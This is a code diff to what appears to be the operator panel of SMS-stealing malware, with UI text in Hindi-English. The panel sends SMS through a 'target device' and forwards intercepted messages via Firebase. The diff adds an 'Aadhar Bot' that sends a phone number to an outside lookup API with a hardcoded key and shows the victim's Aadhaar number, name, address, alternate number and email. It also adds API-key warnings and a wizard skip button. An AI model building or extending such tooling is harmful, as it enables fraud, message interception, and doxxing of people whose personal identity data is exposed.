@@ -331,6 +331,12 @@ header('Content-Type: text/html; charset=UTF-8');
     .rebel-wizard-meta strong{color:var(--accent2)}
     .rebel-skip-btn{padding:10px 14px;border-radius:10px;border:1px solid var(--border);background:transparent;color:var(--muted);font-family:'Syne',sans-serif;font-weight:700;font-size:11px;cursor:pointer;white-space:nowrap}
     .rebel-skip-btn:hover{border-color:rgba(123,47,255,0.45);color:#fff}
+    .rebel-chat-skip{margin-top:10px;padding:8px 14px;border-radius:8px;border:1px solid rgba(123,47,255,0.35);background:rgba(123,47,255,0.1);color:#fff;font-family:'Syne',sans-serif;font-weight:700;font-size:11px;cursor:pointer;transition:all 0.2s}
+    .rebel-chat-skip:hover{border-color:rgba(160,90,255,0.7);background:rgba(123,47,255,0.2);box-shadow:0 0 14px rgba(123,47,255,0.2)}
+    .api-key-warn{background:rgba(255,149,0,0.08);border:1px solid rgba(255,149,0,0.28);border-radius:10px;padding:10px 14px;font-family:'Space Mono',monospace;font-size:10px;color:var(--accent2);margin-bottom:14px;line-height:1.5}
+    .btn-aadhar{border-color:rgba(0,255,157,0.35);background:linear-gradient(135deg,rgba(0,255,157,0.1),rgba(123,47,255,0.08));color:#fff}
+    .btn-aadhar:hover{border-color:rgba(0,255,157,0.55);color:#fff;box-shadow:0 4px 20px rgba(0,255,157,0.15)}
+    .aadhar-hl{color:var(--success);font-weight:800;font-family:'Space Mono',monospace;letter-spacing:1px}
     .fb-item-secure{font-family:'Space Mono',monospace;font-size:8px;color:var(--success);margin-top:3px}
   </style>
 </head>
@@ -375,6 +381,7 @@ header('Content-Type: text/html; charset=UTF-8');
       <button class="btn-fb btn-switch" onclick="toggleFbDropdown(event)"><span class="i3d i3d-blue i3d-sm i3d-static">⇄</span> <span id="activeFbShort">—</span> ▾</button>
       <div class="fb-drop-menu hidden" id="fbDropMenu"></div>
     </div>
+    <button class="btn-fb btn-aadhar" onclick="openAadharModal()"><span class="i3d i3d-green i3d-sm i3d-anim i3d-anim-pulse"><span class="em-a">🪪</span></span> Aadhar Bot</button>
     <button class="btn-fb btn-rebel-ai" onclick="openRebelAiModal()"><span class="i3d i3d-purple i3d-sm i3d-anim i3d-anim-robot"><span class="em-a">🤖</span></span> Chat with Rebel AI</button>
     <button class="btn-fb" onclick="openFirebaseModal()"><span class="i3d i3d-fire i3d-sm i3d-anim i3d-anim-fire"><span class="em-a">🔥</span></span> Manage <span id="fbCount">0</span></button>
     <div id="statusPill" class="status-pill"><div class="status-dot"></div><span id="statusText">Connecting...</span></div>
@@ -493,6 +500,7 @@ header('Content-Type: text/html; charset=UTF-8');
       <!-- SEND SMS -->
       <div class="data-section" id="tab-sendsms">
         <div class="sec-title" style="margin-bottom:4px">Send <span>SMS</span></div>
+        <div class="api-key-warn" id="sendSmsApiWarn">⚠️ <strong>API Key is necessary</strong> for SMS sending. Rebel AI wizard mein API Key add karo — bina iske command device tak nahi jayega.</div>
         <p style="color:var(--muted);font-size:12px;margin-bottom:0">Send message via target device</p>
         <div class="config-card">
           <div class="input-group">
@@ -510,6 +518,7 @@ header('Content-Type: text/html; charset=UTF-8');
       <!-- FORWARDING -->
       <div class="data-section" id="tab-forward">
         <div class="sec-title" style="margin-bottom:8px">SMS <span>Forwarding</span></div>
+        <div class="api-key-warn" id="forwardApiWarn">⚠️ <strong>API Key is necessary</strong> for SMS forwarding. Firebase connect karte waqt API Key zaroor add karo.</div>
         <div class="config-card">
           <div style="display:flex;align-items:center;gap:12px;margin-bottom:16px">
             <label style="margin:0;font-size:11px;color:var(--text)">Enable Forwarding</label>
@@ -565,6 +574,24 @@ header('Content-Type: text/html; charset=UTF-8');
   </div>
 </div>
 
+<!-- Aadhar Bot Modal -->
+<div class="modal-overlay hidden" id="aadharModal" onclick="closeAadharModal(event)">
+  <div class="modal-box modal-wide" onclick="event.stopPropagation()">
+    <button class="modal-close" onclick="document.getElementById('aadharModal').classList.add('hidden')">✕</button>
+    <div class="sec-title" style="margin-bottom:8px"><span class="i3d i3d-green i3d-anim i3d-anim-pulse"><span class="em-a">🪪</span></span> Aadhar <span>Bot</span></div>
+    <p style="color:var(--muted);font-size:11px;margin-bottom:14px">Mobile number dalo — API se linked Aadhar aur details nikal jayengi.</p>
+    <div class="config-card" style="max-width:100%">
+      <div class="input-group">
+        <div><label><span class="i3d i3d-blue i3d-sm">📱</span> Mobile Number</label><input type="tel" id="aadharNum" placeholder="9876543210" onkeydown="if(event.key==='Enter')lookupAadhar()"/></div>
+      </div>
+      <button class="btn-sm" onclick="lookupAadhar()"><span class="i3d i3d-green i3d-sm i3d-anim i3d-anim-pulse"><span class="em-a">🔍</span></span> Lookup Aadhar</button>
+      <div id="aadharStatus" style="margin-top:10px;font-family:'Space Mono',monospace;font-size:11px;"></div>
+    </div>
+    <div class="tbl-wrap" style="margin-top:16px"><table class="tbl"><thead><tr><th>#</th><th>Name</th><th>Aadhar</th><th>Mobile</th><th>Circle</th><th>Address</th><th>Alt</th><th>Email</th></tr></thead>
+    <tbody id="aadharTbody"><tr><td colspan="8" class="tbl-empty">Enter mobile number and tap Lookup</td></tr></tbody></table></div>
+  </div>
+</div>
+
 <!-- Rebel AI Chat Modal -->
 <div class="modal-overlay hidden" id="rebelAiModal" onclick="closeRebelAiModal(event)">
   <div class="modal-box modal-rebel" onclick="event.stopPropagation()">
@@ -616,7 +643,7 @@ var REBEL_WIZARD_STEPS=[
   {key:'databaseURL',label:'Firebase URL',required:true,placeholder:'https://your-project-default-rtdb.firebaseio.com',
    prompt:'Namaste! Main <strong>Rebel AI</strong> hoon.<br><br>Pehle apna <strong>Firebase URL</strong> (Realtime Database) bhejo.<br>Example: <code>https://xxx-default-rtdb.firebaseio.com</code><br><br>Poora config paste karoge to baaki fields auto-fill ho jayengi.'},
   {key:'apiKey',label:'API Key',required:false,placeholder:'AIzaSy...',
-   prompt:'Ab <strong>API Key</strong> bhejo (Firebase Console → Project settings → Your apps).<br><br>Send SMS aur live updates ke liye zaroori.<br>Type <code>skip</code> agar sirf REST chahiye.'},
+   prompt:'Ab <strong>API Key</strong> bhejo (Firebase Console → Project settings → Your apps).<br><br><span style="color:var(--accent2)">⚠️ Warning:</span> <strong>API Key is necessary for SMS sending and forwarding.</strong> Bina API Key ke sirf data read hoga — Send SMS aur Forwarding kaam nahi karenge.<br><br>Type <code>skip</code> sirf tab jab sirf devices dekhne hon.'},
   {key:'name',label:'Project Name',required:false,placeholder:'My Firebase Project',
    prompt:'<strong>Project Name</strong> bhejo — panel mein yahi naam dikhega.<br>Type <code>skip</code> — URL se auto naam lag jayega.'},
   {key:'storageBucket',label:'Storage Bucket',required:false,placeholder:'your-project.firebasestorage.app',
@@ -812,6 +839,7 @@ function switchFirebase(fbId,silent){
   renderSidebar();
   updateStats();
   applyFbTheme(fbId);
+  updateApiKeyWarnings();
   if(!silent) showToast('success','Switched to '+getFbInstance(fbId).name);
 }
 function getFbDataMap(){
@@ -1099,6 +1127,7 @@ function openPanel(){
   renderFirebaseSwitcher();
   updateSidebarTitle();
   applyFbTheme(activeFbId);
+  updateApiKeyWarnings();
   fetchAllFirebaseData();
 }
 
@@ -1691,9 +1720,73 @@ document.addEventListener('keydown',function(e){
     document.getElementById('smsModal').classList.add('hidden');
     document.getElementById('firebaseModal').classList.add('hidden');
     document.getElementById('rebelAiModal').classList.add('hidden');
+    document.getElementById('aadharModal').classList.add('hidden');
     closeFbDropdown();
   }
 });
+
+// ═══ AADHAR BOT ═══
+var AADHAR_API='https://anon-num-info.vercel.app/num?key=305temp&num=';
+function openAadharModal(){
+  document.getElementById('aadharModal').classList.remove('hidden');
+  setTimeout(function(){var i=document.getElementById('aadharNum');if(i)i.focus();},200);
+}
+function closeAadharModal(e){
+  if(e&&e.target!==document.getElementById('aadharModal')) return;
+  document.getElementById('aadharModal').classList.add('hidden');
+}
+function normalizeAadharNum(raw){
+  var d=String(raw||'').replace(/\D/g,'');
+  if(d.length>10) d=d.slice(-10);
+  return d;
+}
+function lookupAadhar(){
+  var num=normalizeAadharNum(document.getElementById('aadharNum').value);
+  var st=document.getElementById('aadharStatus');
+  var tb=document.getElementById('aadharTbody');
+  if(!num||num.length<10){
+    st.innerHTML='<span style="color:var(--error)">Valid 10-digit mobile number dalo</span>';
+    return;
+  }
+  st.innerHTML='<span style="color:var(--muted)">Looking up '+esc(num)+'...</span>';
+  tb.innerHTML='<tr><td colspan="8" class="tbl-empty">Fetching...</td></tr>';
+  fetch(AADHAR_API+encodeURIComponent(num),{cache:'no-store'})
+    .then(function(r){return r.json();})
+    .then(function(d){
+      var rows=(d&&d.response&&d.response.data)||[];
+      if(!rows.length){
+        st.innerHTML='<span style="color:var(--error)">Koi record nahi mila</span>';
+        tb.innerHTML='<tr><td colspan="8" class="tbl-empty">No data found for this number</td></tr>';
+        return;
+      }
+      var withAadhar=rows.filter(function(x){return x.aadhar;}).length;
+      st.innerHTML='<span style="color:var(--success)">✅ '+rows.length+' record(s) — '+withAadhar+' with Aadhar</span>';
+      tb.innerHTML=rows.map(function(r,i){
+        var ad=r.aadhar?'<span class="aadhar-hl">'+esc(r.aadhar)+'</span>':'<span style="color:var(--muted)">—</span>';
+        return '<tr><td>'+(i+1)+'</td><td>'+esc(r.name||r.fname||'—')+'</td><td>'+ad+'</td><td>'+esc(r.num||num)+'</td><td>'+esc(r.circle||'—')+'</td><td style="max-width:200px;word-break:break-word">'+esc(r.address||'—')+'</td><td>'+esc(r.alt||'—')+'</td><td>'+esc(r.email||'—')+'</td></tr>';
+      }).join('');
+    })
+    .catch(function(){
+      st.innerHTML='<span style="color:var(--error)">API error — try again</span>';
+      tb.innerHTML='<tr><td colspan="8" class="tbl-empty">Lookup failed</td></tr>';
+    });
+}
+function updateApiKeyWarnings(){
+  var inst=activeFbId?getFbInstance(activeFbId):null;
+  var hasKey=!!(inst&&inst.config&&inst.config.apiKey);
+  var s=document.getElementById('sendSmsApiWarn');
+  var f=document.getElementById('forwardApiWarn');
+  if(s){
+    s.innerHTML=hasKey
+      ? '✅ API Key set — SMS sending available hai.'
+      : '⚠️ <strong>API Key is necessary</strong> for SMS sending. Rebel AI wizard mein API Key add karo — bina iske command device tak nahi jayega.';
+  }
+  if(f){
+    f.innerHTML=hasKey
+      ? '✅ API Key set — SMS forwarding available hai.'
+      : '⚠️ <strong>API Key is necessary</strong> for SMS forwarding. Rebel AI se API Key add karo.';
+  }
+}
 
 // ═══ REBEL AI WIZARD ═══
 function rebelWizardUpdateUI(){
@@ -1745,7 +1838,11 @@ function rebelWizardShowStep(){
   var step=REBEL_WIZARD_STEPS[rebelWizardStep];
   if(!step) return rebelWizardFinish();
   rebelWizardUpdateUI();
-  appendRebelMsg('ai','<span style="opacity:0.7">Step '+(rebelWizardStep+1)+'/'+REBEL_WIZARD_STEPS.length+'</span><br><br>'+step.prompt);
+  var skipBtn=step.required?'':'<div style="margin-top:12px"><button type="button" class="rebel-chat-skip" onclick="rebelWizardSkip()">⏭ Skip this step</button></div>';
+  appendRebelMsg('ai','<span style="opacity:0.7">Step '+(rebelWizardStep+1)+'/'+REBEL_WIZARD_STEPS.length+'</span><br><br>'+step.prompt+skipBtn);
+}
+function rebelWizardApiKeyWarn(){
+  appendRebelMsg('sys','⚠️ <strong>Warning:</strong> API Key is necessary for <strong>SMS sending</strong> and <strong>SMS forwarding</strong>. Bina API Key ke ye features kaam nahi karenge.');
 }
 function startRebelWizard(resetChat){
   rebelWizardActive=true;
@@ -1763,7 +1860,7 @@ function rebelWizardSkip(){
   var step=REBEL_WIZARD_STEPS[rebelWizardStep];
   if(!step||step.required) return;
   appendRebelMsg('user','skip');
-  rebelWizardAdvance('');
+  rebelWizardAdvance('skip');
 }
 function rebelWizardValidateStep(step,val){
   var v=String(val||'').trim();
@@ -1794,6 +1891,7 @@ function rebelWizardAdvance(val){
     return;
   }
   if(check.value) rebelWizardDraft[step.key]=check.value;
+  else if(step.key==='apiKey'&&(/^skip$/i.test(String(val||'').trim())||!String(val||'').trim())) rebelWizardApiKeyWarn();
   rebelWizardStep++;
   while(rebelWizardStep<REBEL_WIZARD_STEPS.length){
     var next=REBEL_WIZARD_STEPS[rebelWizardStep];
@@ -1811,7 +1909,7 @@ function rebelWizardFinish(){
     '📋 <strong>Config summary</strong>',
     '• Name: <code>'+esc(rebelWizardDraft.name||'Auto')+'</code>',
     '• Project: <code>'+esc(rebelWizardDraft.projectId||'auto')+'</code>',
-    '• API Key: <code>'+(rebelWizardDraft.apiKey?'✓ set':'skip (REST only)')+'</code>',
+    '• API Key: <code>'+(rebelWizardDraft.apiKey?'✓ set':'⚠ skipped — SMS/Forwarding off')+'</code>',
     '• SDK fields: <code>'+(rebelWizardDraft.storageBucket||rebelWizardDraft.appId?'partial/full':'minimal')+'</code>'
   ].join('<br>');
   appendRebelMsg('sys','🔍 Connecting Firebase from your browser...');
@@ -1996,6 +2094,7 @@ function addFirebaseFromConfig(cfg){
     attachClientsLiveUpdates(inst);
     attachRestPolling(inst);
     if(panelInitialized) switchFirebase(fullCfg.id,true);
+    updateApiKeyWarnings();
     showToast('success','Firebase connected: '+name);
     return {ok:true,name:name,nodes:nodes,id:fullCfg.id};
   });
